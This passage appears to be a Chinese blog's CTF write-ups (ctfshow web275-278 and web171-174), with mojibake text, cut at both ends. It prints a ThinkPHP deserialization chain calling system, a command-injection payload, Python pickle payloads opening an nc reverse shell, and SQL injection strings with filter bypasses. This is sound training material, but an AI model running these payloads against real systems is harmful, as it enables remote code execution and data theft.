class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//GETä¼ å‚ shell</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;shell&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;shell&#x27;</span> =&gt; []];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// è¡¨å•è¯·æ±‚ç±»å‹ä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">        <span class="comment">// è¡¨å•ajaxä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">        <span class="comment">// è¡¨å•pjaxä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">        <span class="comment">// PATHINFOå˜é‡å ç”¨äºå…¼å®¹æ¨¡å¼</span></span><br><span class="line">        <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="comment">// å…¼å®¹PATH_INFOè·å–</span></span><br><span class="line">        <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">        <span class="comment">// é»˜è®¤å…¨å±€è¿‡æ»¤æ–¹æ³• ç”¨é€—å·åˆ†éš”å¤šä¸ª</span></span><br><span class="line">        <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// åŸŸåæ ¹ï¼Œå¦‚thinkphp.cn</span></span><br><span class="line">        <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// HTTPSä»£ç†æ ‡è¯†</span></span><br><span class="line">        <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// IPä»£ç†è·å–æ ‡è¯†</span></span><br><span class="line">        <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">        <span class="comment">// URLä¼ªé™æ€åç¼€</span></span><br><span class="line">        <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&#x27;var_pjax&#x27;</span> =&gt; <span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&#x27;visible&#x27;</span> =&gt; [<span class="variable language_">$this</span>,<span class="string">&#x27;isPjax&#x27;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230108001955291.png" alt="image-20230108001955291"></p><p><strong>GET  shell ä¼ å‚ã€‚</strong></p><h2 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h2><p>æºç </p><p><strong><img src="../images/image-20230108143551463.png" alt="image-20230108143551463"></strong></p><p>è¿™é¢˜è·Ÿååºåˆ—è¯æ²¡å•¥å¤ªå¤§å…³ç³»ï¼Œå°±æ˜¯ç†æ¸…é€»è¾‘å…³ç³»å°±å¯ä»¥æˆåŠŸæ‹¿åˆ°flagã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>ç›®çš„å°±æ˜¯ä¸ºäº†ä½¿evilfileä¸ºtrueï¼Œç„¶åæ‰§è¡Œè¿™ä¸ªå‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="comment">//å†™å…¥æ–‡ä»¶å†…å®¹</span></span><br><span class="line">      <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">      <span class="comment">//å¤åˆ¶æ–‡ä»¶,ç”Ÿæˆçš„æ–°æ–‡ä»¶åè¿›è¡Œmd5åŠ å¯†+éšæœºæ•°</span></span><br><span class="line">      <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">      <span class="comment">//åˆ é™¤åŸæ¥çš„æ–‡ä»¶</span></span><br><span class="line">      <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çŸ¥é“è¿™äº›ä»¥åï¼Œå°±å¯ä»¥æˆåŠŸè¿›è¡Œrceäº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>åªéœ€è¦ä¸¤ä¸ªå‚æ•°ä¸­å«æœ‰å¯¹åº”çš„å€¼å°±è¡Œäº†ã€‚</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="function"><span class="keyword">fn</span>=<span class="title">php</span></span>;tac f*</span><br></pre></td></tr></table></figure><h2 id="web276-pharååºåˆ—åŒ–"><a href="#web276-pharååºåˆ—åŒ–" class="headerlink" title="web276(pharååºåˆ—åŒ–)"></a>web276(pharååºåˆ—åŒ–)</h2><p>æºç </p><p><img src="../images/image-20230113165336370.png" alt="image-20230113165336370"></p><h2 id="web277-pythonååºåˆ—åŒ–"><a href="#web277-pythonååºåˆ—åŒ–" class="headerlink" title="web277(pythonååºåˆ—åŒ–)"></a>web277(pythonååºåˆ—åŒ–)</h2><p><strong>é¢˜ç›®</strong></p><p><img src="../images/image-20230312123235906.png" alt="image-20230312123235906"></p><p><strong>é€šè¿‡pickleåˆ¤æ–­å‡ºæ˜¯pythonååºåˆ—åŒ–</strong></p><p>è¿™é‡Œpythonååºåˆ—åŒ–å’Œphpçš„ååºåˆ—åŒ–å·®ä¸å¤šï¼Œä½†æ˜¯pythonçš„ååºåˆ—åŒ–æ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰phpé‚£ä¹ˆèŠ±é‡Œèƒ¡å“¨çš„ã€‚</p><p><code>dumps()</code>æ˜¯åºåˆ—åŒ–çš„æ–¹æ³•</p><p><code>loads()</code>æ˜¯ååºåˆ—åŒ–çš„æ–¹æ³•</p><p><a href="https://www.bilibili.com/video/BV1D64y1m78f?p=24&amp;spm_id_from=pageDriver&amp;vd_source=bacfffe46b930fda5761b63367eb298c">ç¾¤ä¸»è®²çš„wp</a></p><p>è¿™é‡Œpythonååºåˆ—åŒ–çš„å…³é”®å°±æ˜¯  <code>__reduce</code>__é­”æ³•å‡½æ•°ï¼Œå°±æ˜¯åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥è¿›è¡Œå¯¹ååºåˆ—åŒ–çš„å€¼è¿›è¡Œæ“æ§ï¼Œä»è€Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><p><img src="../images/image-20230312122011395.png" alt="image-20230312122011395"></p><p>ç½‘ä¸Šéšä¾¿æ‰¾çš„ä¸€ä¸ªè§£é‡Š</p><p>pythonååºåˆ—åŒ–è¯çš„ä¸»è¦å°±æ˜¯è¿™ä¸ªæ–¹æ³•ï¼Œæ²¡æœ‰åƒphpé‚£ä¹ˆèŠ±é‡Œèƒ¡å“¨å¾—åˆ°</p><p>åªè¦å¯¹ç¬¬ä¸€å’Œç¬¬äºŒä¸ªå‚æ•°è¿›è¡Œæ§åˆ¶å°±è¡Œ</p><p>ç¬¬ä¸€ä¸ªå‚æ•° â€”-&gt;  å°±æ˜¯æ–¹æ³•ï¼Œä¾‹å¦‚system  evalè¿™ç§</p><p>ç¬¬äºŒä¸ªå‚æ•° â€”â€”&gt;  å°±æ˜¯å†…å®¹ï¼Œå°±æ˜¯è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„å†…å®¹ </p><p>è¿™è¦æ§åˆ¶è¿™ä¸¤ä¸ªæ–¹æ³•çš„è¯ï¼Œé‚£ä¹ˆå°±æ˜¯è¿›è¡Œè‡ªå·±æƒ³è¦çš„å‘½ä»¤æ‰§è¡Œäº†</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CTFshow</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sw</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.show)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.show=show</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc xxx.xxx.xxx.xxx port -e /bin/sh&#x27;).read()&quot;</span>,))</span><br><span class="line">cs = CTFshow(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">ctfshow_ser=pickle.dumps(cs)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(ctfshow_ser))</span><br></pre></td></tr></table></figure><p>å› ä¸ºé¢˜ç›®æ— å›æ˜¾ï¼Œæ‰€ä»¥åå¼¹shell</p><p>è¿™é‡Œè¯åå¼¹shellæœ‰å¾ˆå¤šç§æ–¹æ³•ï¼Œå¦‚æœé¢˜ç›®ç¦ç”¨è¿™ç§çš„è¯ï¼Œå¯ä»¥è‡ªå·±å»googleä¸€ä¸‹ï¼Œç½‘ä¸ŠæŒºå¤šçš„</p><p><img src="../images/image-20230312123519474.png" alt="image-20230312123519474"></p><p>æœ‰äº›æ—¶å€™è·‘çš„payloadä¸æˆåŠŸï¼Œå¯èƒ½æ˜¯å› ä¸ºpvmè®¤è¯çš„åè®®ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æœ‰æ—¶æ—¶å€™æˆ‘ä»¬å¯ä»¥åŠ ä¸Šã€‚</p><p><img src="../images/image-20230312123626529.png" alt="image-20230312123626529"></p><p>å°±åƒè¿™æ ·å†™</p><p>åå¼¹shellåæ‹¿åˆ°flag</p><p><img src="../images/image-20230312124206547.png" alt="image-20230312124206547"></p><h2 id="web278-pythonååºåˆ—åŒ–"><a href="#web278-pythonååºåˆ—åŒ–" class="headerlink" title="web278(pythonååºåˆ—åŒ–)"></a>web278(pythonååºåˆ—åŒ–)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230312160036945.png" alt="image-20230312160036945"></p><p>é¢˜ç›®æç¤ºè¿‡æ»¤äº† <code>os.system</code>,è¿™é‡Œè¯è¿‡æ»¤æ˜¯çœ‹åºåˆ—åŒ–é‡Œæœ‰æ²¡æœ‰<code>os.system</code>çš„ï¼Œå› ä¸ºæˆ‘ä»¬ä¸Šä¸€é¢˜ç”¨çš„æ˜¯popen,å¹¶ä¸æ˜¯ç”¨çš„os.system,æ‰€ä»¥ä¸Šä¸€é¢˜çš„paylaodè¿˜æ˜¯å¯ä»¥ç”¨çš„</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CTFshow</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sw</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.show)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.show=show</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc xxx.xxx.xxx.xxx port -e /bin/sh&#x27;).read()&quot;</span>,))</span><br><span class="line">cs = CTFshow(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">ctfshow_ser=pickle.dumps(cs)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(ctfshow_ser))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-sqlæ³¨å…¥ åˆ·é¢˜è®°å½•</title>
      <link href="/posts/b77a4eaf.html"/>
      <url>/posts/b77a4eaf.html</url>
      
        <content type="html"><![CDATA[<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>æºç </p><p><img src="../images/image-20221226192746294.png" alt="image-20221226192746294"></p><p>ç»™äº†ä¸€ä¸ªsqlè¯­å¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™sqlè¯­å¥æ¥è¿›è¡Œåˆ¤æ–­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è‡ªå·±æ–°å»ºä¸€ä¸ªæ•°æ®åº“æ¥æµ‹è¯•ã€‚</p><p>å°±æ˜¯åˆ©ç”¨phpstudyå’Œnavicat    ï¼ˆç½‘ä¸Šæœ‰æ•™ç¨‹ï¼Œå¯ä»¥å»æ‹¿æ¥å­¦ä¹ å­¦ä¹ ï¼‰</p><p><img src="../images/image-20221226193154082.png" alt="image-20221226193154082"></p><p>æ–°å»ºäº†ä¸€ä¸ªå’Œé¢˜ç›®å·®ä¸å¤šçš„userè¡¨ï¼Œç„¶åå°±å¯è¿›è¡Œæµ‹è¯•ã€‚</p><p><img src="../images/image-20221226193548945.png" alt="image-20221226193548945"></p><p>é€šè¿‡è¿™å‡ ä¸ªç®€å•çš„æµ‹è¯•ï¼Œå‘ç°äº†å°±æ˜¯è™½ç„¶usernameä¸ç­‰äºflagçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨idï¼Œå°±ä»¤å‰é¢çš„id=xxä¸æˆç«‹çš„æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥ç”¨åˆ°åé¢çš„idäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—ä»¥åé¢çš„idä¸ºçªç ´å£ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or id=&#x27;xxx     &#x27;&#x27;æ˜¯ä¸ºäº†é—­åˆsqlè¯­å¥ï¼Œå¦åˆ™æ— æ³•æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p><strong>è§£æ³•</strong></p><p>è¿™é“é¢˜çš„è§£æ³•æ˜¯çœ‹åˆ°åªèƒ½æŸ¥åˆ°id=24,æˆ‘ä»¬å°±æ€€ç–‘ä¼šä¸ä¼šè—åœ¨åé¢ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¸€ä¸ªä¸€ä¸ªçš„è¯•å‡ºæ¥ã€‚</p><p><img src="../images/image-20221226193930975.png" alt="image-20221226193930975"></p><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>æºç </p><p><img src="../images/image-20221226203357870.png" alt="image-20221226203357870"></p><p><img src="../images/image-20221226203412925.png" alt="image-20221226203412925"></p><p>è¿™é“é¢˜ç›´æ¥ç”¨ä¸Šä¸€é“é¢˜çš„è§£æ³•ï¼Œè¿™é“é¢˜å°±è§£ä¸äº†äº†é‚£ä¹ˆå¯ä»¥æ¢åˆ«çš„è§£æ³•ï¼Œå°±æ˜¯unionè”åˆæ³¨å…¥ã€‚</p><p>å°±æ˜¯å¯ä»¥æœ¬åœ°è¯•ä¸€ä¸‹ï¼Œå¦‚æœæˆåŠŸäº†è¯ï¼Œå°±å¯ä»¥æ‹¿å»é¢˜ç›®è¯•ä¸€ä¸‹</p><p><img src="../images/image-20221226204544643.png" alt="image-20221226204544643"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select id,password from user where username=&#x27;flag</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒæŸ¥è¯¢åˆ—çš„æ•°é‡è¦å’Œé¢˜ç›®ç»™çš„è¯­å¥ä¸­åˆ—çš„æ•°é‡ä¸€æ ·</p><p>è¿™å¥è¯æˆåŠŸæ‰§è¡Œäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ‹¿å»é¢˜ç›®è¯•ä¸€ä¸‹ï¼Œå‘ç°ä¹Ÿå¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œå°±æ‹¿åˆ°flagäº†ã€‚</p><p><img src="../images/image-20221226204645887.png" alt="image-20221226204645887"></p><p><strong>ä¹Ÿå¯ä»¥åˆ©ç”¨æ¨¡ç³ŠæŸ¥è¯¢ï¼Œä½†æ˜¯åªèƒ½æœ¬åœ°é€šè¿‡ï¼Œé¢˜ç›®ä¸èƒ½é€šè¿‡ã€‚</strong></p><p><img src="../images/image-20221226205245342.png" alt="image-20221226205245342"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or username like &#x27;%f%</span><br></pre></td></tr></table></figure><p><strong>è¡¥å……ç‚¹çŸ¥è¯†</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql  ä¸­çš„ç‚¹æ˜¯ &#x27; . &#x27;  å¯ä»¥è¿™æ ·ç”¨ï¼Œå†æœ‰å¤šä¸ªæ•°æ®åº“çš„æƒ…å†µä¸‹ï¼Œ </span><br><span class="line">æ•°æ®åº“å.xxxxx    ä¾‹å¦‚è¿™é“é¢˜å°±å¯ä»¥è¿™æ ·ç”¨  ctfshow_user2.username   ctfshow_user2.id</span><br><span class="line">ctfshow_user2.password</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¹Ÿå¯ä»¥æŠŠæ•°æ®åº“è®¾åšåˆ«çš„åå­—ã€‚   åˆ©ç”¨çš„æ˜¯   as  è¿™ä¸ªå•è¯</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select b.id,b.password from user as b where b.username=&#x27;flag</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select id,password from ctfshow_user2 where username=&#x27;flag</span><br></pre></td></tr></table></figure><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>æºç </p><p><img src="../images/image-20221226210521949.png" alt="image-20221226210521949"></p><p>è¿™é“é¢˜æ˜¯ç»“æœè¿”å›çš„è¿‡ç¨‹ä¸­ä¸èƒ½å‡ºç°flag,é‚£ä¹ˆæˆ‘ä»¬å°±å¾—æƒ³åŠæ³•æŠŠflagç»™ç»•è¿‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è½¬æ¢è¿›åˆ¶æ¥ç»•è¿‡ã€‚</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select id,bin(username),password from ctfshow_user3 where username=&#x27;flag</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥æ¢æˆhex   â€”&gt;16è¿›åˆ¶ã€‚</p><p><img src="../images/image-20221226211348202.png" alt="image-20221226211348202"></p><p>é‚£ä¹ˆå°±å¯ä»¥æˆåŠŸæ‹¿åˆ°flagäº†ã€‚</p><p>æœ€å¥½æ˜¯æœ¬åœ°æµ‹è¯•é€šè¿‡ååœ¨æ¬åˆ°é¢˜ç›®ä¸Š</p><p><img src="../images/image-20221226211450157.png" alt="image-20221226211450157"></p><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>æºç </p><p><img src="../images/image-20221226225822637.png" alt="image-20221226225822637"></p><p>åˆ©ç”¨å‰é¢çš„è¯­å¥å·²ç»è§£ä¸å‡ºæ¥äº†ï¼Œå› ä¸ºå°±æ˜¯æŠŠflagå’Œæ•°å­—éƒ½å±è”½æ‰äº†ï¼Œå› ä¸ºflagä¸­è¿˜å«æœ‰æ•°å­—ï¼Œæ‰€ä»¥å°±å¾—ä½¿ç”¨æ›¿æ¢ã€‚</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9999&#x27;union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),&#x27;1&#x27;,&#x27;nba&#x27;),&#x27;2&#x27;,&#x27;nbb&#x27;),&#x27;3&#x27;,&#x27;nbc&#x27;),&#x27;4&#x27;,&#x27;nbd&#x27;),&#x27;5&#x27;,&#x27;nbe&#x27;),&#x27;6&#x27;,&#x27;nbf&#x27;),&#x27;7&#x27;,&#x27;nbg&#x27;),&#x27;8&#x27;,&#x27;nbh&#x27;),&#x27;9&#x27;,&#x27;nbi&#x27;),&#x27;0&#x27;,&#x27;nbj&#x27;),&#x27;a&#x27; from ctfshow_user4 where username=&#x27;flag&#x27;--+</span><br></pre></td></tr></table></figure><p>â€”+æŒ‡çš„æ˜¯æ³¨é‡Š</p><p>è¿™ä¸ªpyçš„æ„æ€å°±æ˜¯æŠŠflagä¸­çš„æ•°å­—å…¨éƒ¨æ›¿æ¢æˆåˆ«çš„ï¼Œç”¨16è¿›åˆ¶è½¬æ¢çš„åŸå› æ˜¯ï¼Œå› 